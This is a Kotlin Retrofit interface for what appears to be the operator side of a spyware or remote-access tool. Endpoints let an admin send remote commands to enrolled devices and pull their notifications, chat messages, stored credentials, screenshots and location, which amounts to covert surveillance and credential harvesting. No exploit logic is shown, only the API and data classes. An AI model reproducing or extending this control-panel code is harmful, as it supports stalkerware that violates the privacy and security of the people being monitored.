package com.chats.controller.network

import com.chats.controller.models.*
import retrofit2.Response
import retrofit2.http.*

interface ControllerApiService {
    
    // Authentication
    @POST("api/auth/login")
    suspend fun login(
        @Body loginRequest: LoginRequest
    ): Response<LoginResponse>
    
    @GET("api/auth/me")
    suspend fun getCurrentUser(): Response<ApiResponse<User>>
    
    // Devices
    @GET("api/devices")
    suspend fun getDevices(): Response<DeviceListResponse>
    
    @GET("api/devices/{deviceId}")
    suspend fun getDevice(
        @Path("deviceId") deviceId: String
    ): Response<ApiResponse<Device>>
    
    // Commands
    @POST("api/commands")
    suspend fun sendCommand(
        @Body command: CommandRequest
    ): Response<CommandResponse>
    
    @GET("api/devices/{deviceId}/commands")
    suspend fun getDeviceCommands(
        @Path("deviceId") deviceId: String,
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<ApiResponse<List<Command>>>
    
    // Device Data
    @GET("api/notifications")
    suspend fun getDeviceNotifications(
        @Query("deviceId") deviceId: String,
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<ApiResponse<List<Notification>>>
    
    @GET("api/chats")
    suspend fun getDeviceChats(
        @Query("deviceId") deviceId: String,
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<ApiResponse<List<Chat>>>
    
    @GET("api/credentials")
    suspend fun getDeviceCredentials(
        @Query("deviceId") deviceId: String,
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<CredentialsResponse>
    
    @GET("api/devices/{deviceId}/screenshots")
    suspend fun getDeviceScreenshots(
        @Path("deviceId") deviceId: String,
        @Query("page") page: Int = 1,
        @Query("limit") limit: Int = 50
    ): Response<ScreenshotsResponse>
    
    @GET("api/devices/{deviceId}/location")
    suspend fun getDeviceLocation(
        @Path("deviceId") deviceId: String
    ): Response<ApiResponse<Any>>
}

data class LoginRequest(
    val email: String? = null,
    val username: String? = null,
    val password: String,
    val loginType: String? = null // "admin" or "device_owner"
)

data class Command(
    val id: String,
    val deviceId: String,
    val action: String,
    val parameters: Map<String, Any>?,
    val status: String,
    val result: String?,
    val createdAt: Long?,
    val executedAt: Long?
)
